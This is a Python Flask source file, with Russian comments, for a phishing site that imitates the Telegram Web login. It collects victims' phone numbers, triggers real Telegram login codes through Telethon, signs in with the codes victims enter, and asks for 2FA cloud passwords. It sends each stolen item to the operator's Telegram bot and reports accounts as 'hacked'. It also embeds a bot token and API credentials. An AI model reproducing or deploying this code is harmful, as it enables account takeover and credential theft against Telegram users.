from flask import Flask, request, redirect, url_for, render_template_string
import requests
from telethon import TelegramClient
import asyncio

app = Flask(__name__)

# --- НАСТРОЙКИ БОТА ---
BOT_TOKEN = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw"
CHAT_ID = "9264156701:AAFS9etlfwo0SFR-fafjyeqlhF-bpF7qEEw"
# --- НАСТРОЙКИ TELEGRAM API (с my.telegram.org) ---
API_ID = 39783565  # Замени на свой api_id (число)
API_HASH = "5bae681a16b28c835037f5272f04267c"  # Замени на свой api_hash

PROXY = "185.193.30.197:80"  # <--- ВСТАВЬ СЮДА СВОЙ ПРОКСИ (например, "188.163.170.130:41258")

def send_to_tg(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message}
    try:
        # Делаем запрос и ЖДЕМ ответа
        response = requests.post(url, json=payload, timeout=10)
        # Выводим результат в логи Render (видно во вкладке Logs)
        print("СТАТУС ОТПРАВКИ:", response.status_code)
        print("ОТВЕТ TELEGRAM:", response.text)
    except Exception as e:
        print("КРИТИЧЕСКАЯ ОШИБКА ОТПРАВКИ:", e)



# Вспомогательная функция для запуска асинхронного кода Telethon
def send_real_code(phone):
    async def _send():
        # Создаем клиент Telethon (сессия сохраняется в файл)
        client = TelegramClient('session_j', API_ID, API_HASH)
        await client.connect()
        try:
            # Отправляем запрос на получение кода
            await client.send_code_request(phone)
            await client.disconnect()
            return True
        except Exception as e:
            print("Ошибка Telethon (send_code):", e)
            await client.disconnect()
            return False
    
    # Запускаем асинхронный цикл
    return asyncio.run(_send())

# Вспомогательная функция для входа с кодом
def login_with_code(phone, code):
    async def _login():
        client = TelegramClient('session_j', API_ID, API_HASH)
        await client.connect()
        try:
            # Пытаемся войти с кодом
            await client.sign_in(phone, code)
            await client.disconnect()
            return True
        except Exception as e:
            # Если включен 2FA, Telethon выдаст ошибку SessionPasswordNeeded
            if "SessionPasswordNeeded" in str(e):
                await client.disconnect()
                return "2fa"
            await client.disconnect()
            return False
    return asyncio.run(_login())

STYLE = """
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #e6ebee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .login-box { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 320px; text-align: center; }
    h2 { color: #222; font-size: 22px; margin-bottom: 20px; }
    input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dfe1e5; border-radius: 8px; outline: none; font-size: 15px; }
    button { width: 100%; padding: 12px; background: #3390ec; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
    .error { color: #e53935; font-size: 14px; margin-top: 15px; }
</style>
"""

@app.route('/')
def index():
    return render_template_string(f"""
    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
        <div class="login-box">
            <h2>Вход в Telegram</h2>
            <form action="/submit_phone" method="post">
                <input type="text" name="phone" placeholder="Номер телефона" required><br>
                <button type="submit">Далее</button>
            </form>
        </div>
    </body></html>
    """)

@app.route('/submit_phone', methods=['POST'])
def submit_phone():
    phone = request.form.get('phone')
    
    # Отправляем уведомление тебе
    send_to_tg(f"📱 [НОВЫЙ НОМЕР] {phone}")
    
    # ПЫТАЕМСЯ ОТПРАВИТЬ РЕАЛЬНЫЙ КОД ЧЕРЕЗ TELEGRAM
    success = send_real_code(phone)
    
    if success:
        # Если Telegram принял запрос, переходим на ввод кода
        return redirect(url_for('enter_code', phone=phone))
    else:
        # Если ошибка (например, номер не зарегистрирован)
        return render_template_string(f"""
        <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
            <div class="login-box">
                <h2>Ошибка</h2>
                <div class="error">Не удалось отправить код. Проверьте номер.</div>
                <a href="/" style="display:block; margin-top:20px; color:#3390ec; text-decoration:none;">Назад</a>
            </div>
        </body></html>
        """)

@app.route('/code')
def enter_code():
    phone = request.args.get('phone', '')
    return render_template_string(f"""
    <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
        <div class="login-box">
            <h2>Введите код</h2>
            <p style="font-size:14px; color:#666;">Мы отправили код в Telegram на номер <b>{phone}</b>.</p>
            <form action="/submit_code" method="post">
                <input type="hidden" name="phone" value="{phone}">
                <input type="text" name="code" placeholder="Код из СМС" required><br>
                <button type="submit">Далее</button>
            </form>
        </div>
    </body></html>
    """)

@app.route('/submit_code', methods=['POST'])
def submit_code():
    phone = request.form.get('phone')
    code = request.form.get('code')
    
    # Логируем в ТГ
    send_to_tg(f"🔑 [КОД] {phone} | Код: {code}")
    
    # ПЫТАЕМСЯ ВОЙТИ С ЭТИМ КОДОМ
    result = login_with_code(phone, code)
    
    if result == "2fa":
        # Если у жертвы включен пароль 2FA
        return redirect(url_for('twofa', phone=phone))
    elif result == True:
        # Если вошли успешно (2FA выключена)
        send_to_tg(f"✅ [УСПЕХ] Аккаунт {phone} взломан!")
        return "Успешный вход. Вы перенаправлены."
    else:
        # Если код неверный
        return render_template_string(f"""
        <!DOCTYPE html><html><head><title>Telegram Web</title>{STYLE}</head><body>
            <div class="login-box">
                <h2>Ошибка</h2>
                <div class="error">Неверный код. Попробуйте снова.</div>
                <a href="/code?phone={phone}" style="display:block; margin-top:20px; color:#3390ec; text-decoration:none;">Назад</a>
            </div>
        </body></html>
        """)

@app.route('/2fa')
def twofa():
    phone = request.args.get('phone', '')
    html = """
    <!DOCTYPE html><html><head><title>Telegram Web</title>""" + STYLE + """</head><body>
        <div class="login-box">
            <h2>Облачный пароль</h2>
            <form action="/2fa_submit" method="post">
                <input type="hidden" name="phone" value="%s">
                <input type="password" name="password" placeholder="Пароль 2FA" required><br>
                <button type="submit">Войти</button>
            </form>
        </div>
    </body></html>
    """ % phone
    return html


@app.route('/2fa_submit', methods=['POST'])
def twofa_submit():
    phone = request.form.get('phone')
    password = request.form.get('password')
    
    send_to_tg(f"🔒 [2FA ПАРОЛЬ] {phone} | Пароль: {password}")
    
    # В реальности здесь нужно сделать вход с паролем. 
    # Пока просто выведем сообщение.
    return "Ошибка пароля."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
